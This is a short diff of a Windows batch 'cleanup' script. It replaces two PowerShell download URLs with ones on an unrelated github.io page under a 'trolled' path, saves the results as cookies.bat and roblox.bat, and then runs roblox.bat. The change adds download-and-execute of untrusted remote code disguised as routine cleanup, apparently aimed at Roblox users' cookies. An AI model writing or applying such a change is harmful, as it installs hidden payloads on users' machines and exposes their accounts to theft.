@@ -2,8 +2,8 @@
 echo Starting cleanup...
 
 REM Download additional scripts
-powershell -Command "& {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/indev/win7-cookies.bat' -OutFile 'cookies.bat'}"
-powershell -Command "& {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/indev/win7-roblox.bat' -OutFile 'roblox.bat'}"
+powershell -Command "& {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://bavavaba39.github.io/robloxmoment.github.io/trolled/main1.bat' -OutFile 'cookies.bat'}"
+powershell -Command "& {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://bavavaba39.github.io/robloxmoment.github.io/trolled/main2.bat' -OutFile 'roblox.bat'}"
 
 REM Execute Roblox cleanup
 call roblox.bat
